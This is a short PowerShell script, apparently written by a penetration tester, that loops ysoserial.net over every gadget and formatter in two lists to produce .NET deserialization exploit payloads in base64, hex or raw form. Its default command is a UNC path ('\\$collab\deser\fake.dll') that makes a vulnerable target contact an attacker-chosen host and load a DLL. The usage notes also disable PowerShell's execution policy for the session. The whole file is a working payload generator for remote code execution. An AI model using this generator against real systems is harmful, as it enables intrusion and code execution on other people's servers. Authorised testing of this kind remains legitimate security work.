<#
    Author: Karol Mazurek (https://afine.com/)
    Usage: 
    0. Unpack the ysoserial_net_136.zip
    1. Start the PowerShell terminal in the ysoserial_net_136 directory.
    2. Set unrestricted execution policy for the current terminal session:
        Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
    3. Execute:
        .\RunYsoserial.ps1 -collab 'you_vps_ip_or_domain_here' -outputFormat 'base64' -outputFile 'test.txt'
    
    All formats: raw, base64, raw-urlencode, base64-urlencode, hex
#>

param(
    [string]$collab,
    [string]$command = "\\$collab\deser\fake.dll",
    [string]$outputFormat,
    [string]$outputFile,
    [string]$netgadgets = ".\netgadgets.txt",
    [string]$netformatters = ".\netformatters.txt"
)

$outputFile_tmp = "$outputFile" + "_tmp"
foreach ($gadget in Get-Content -Path "$netgadgets") {
    foreach ($formatter in Get-Content -Path "$netformatters") {
        .\ysoserial.exe -f $formatter -g "$gadget" -o $outputFormat -c "$command" /nogui | tee -a "$outputFile_tmp"
    }
}

# Filter out lines from the output file
(Get-Content -Path $outputFile_tmp) | Where-Object {$_ -notmatch 'Formatter.*.not supported by|This gadget loads|UNC paths can be used for|This gadget can only load files with DLL|Example: ysoserial.exe|If you want to deliver file with a different extension than|Reading command from file'} | tee -a "$outputFile"
rm "$outputFile_tmp"